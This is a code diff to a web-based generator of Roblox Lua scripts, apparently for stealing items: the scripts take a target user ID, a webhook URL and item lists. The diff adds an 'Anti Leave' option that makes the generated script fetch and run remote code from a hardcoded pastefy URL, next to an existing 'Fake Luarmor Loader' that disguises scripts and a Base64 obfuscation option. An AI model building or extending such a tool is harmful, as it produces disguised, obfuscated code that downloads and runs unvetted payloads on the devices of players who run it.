@@ -451,6 +451,11 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
         <label class="switch"><input type="checkbox" id="toggleFakeLuarmor"><span class="slider"></span></label>
       </div>
       <div class="toggle-card">
+        <div class="toggle-info"><div class="toggle-icon">🚫</div>
+        <div class="toggle-text"><h4 data-i18n="antiLeave">Anti Leave</h4><p data-i18n="antiLeaveDesc">Activa protección Anti Leave en el script generado.</p></div></div>
+        <label class="switch"><input type="checkbox" id="toggleAntiLeave"><span class="slider"></span></label>
+      </div>
+      <div class="toggle-card">
         <div class="toggle-info"><div class="toggle-icon">🔒</div>
         <div class="toggle-text"><h4 data-i18n="obfuscate">Ofuscar script</h4><p data-i18n="obfuscateDesc">Ofuscación local en Base64.</p></div></div>
         <label class="switch"><input type="checkbox" id="toggleObfuscate"><span class="slider"></span></label>
@@ -570,6 +575,8 @@ const I18N = {
     pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.",
+    antiLeave:"Anti Leave",
+    antiLeaveDesc:"Activa protección Anti Leave en el script generado.",
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscación local en Base64.",
     genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",
@@ -648,6 +655,8 @@ const I18N = {
     pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Upload script to Fake Luarmor and get a Luarmor-style loadstring.",
+    antiLeave:"Anti Leave",
+    antiLeaveDesc:"Enables Anti Leave protection in the generated script.",
     obfuscate:"Obfuscate script",
     obfuscateDesc:"Local Base64 obfuscation.",
     genWarn:"⚠️ SELECT AT LEAST ONE TARGET",
@@ -726,6 +735,8 @@ const I18N = {
     pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",
     fakeLuarmor:"Fake Luarmor Loader",
     fakeLuarmorDesc:"Envie o script para o Fake Luarmor e gere um loadstring estilo Luarmor.",
+    antiLeave:"Anti Leave",
+    antiLeaveDesc:"Ativa proteção Anti Leave no script gerado.",
     obfuscate:"Ofuscar script",
     obfuscateDesc:"Ofuscação local em Base64.",
     genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",
@@ -2334,6 +2345,19 @@ async function generateScript(){
     customBlock = `loadstring(game:HttpGet("${DUEL_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
   }
 
+  const useAntiLeave = document.getElementById("toggleAntiLeave").checked;
+  let execBlock = `    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()`;
+  if (useAntiLeave) {
+    execBlock = `task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/JhWiqjXL/raw"))() -- Anti Leave
+end)
+
+task.spawn(function()
+    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()
+    task.wait(1)
+end)`;
+  }
+
   let script = `getgenv().targetId = ${targetId}
 getgenv().webhookUrl = "${webhookUrl}"
 
@@ -2346,7 +2370,7 @@ ${bs}}
 getgenv().targetGears = {
 ${gr}}
 
-    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()`;
+${execBlock}`;
 
   if(useObfuscate){
     try {
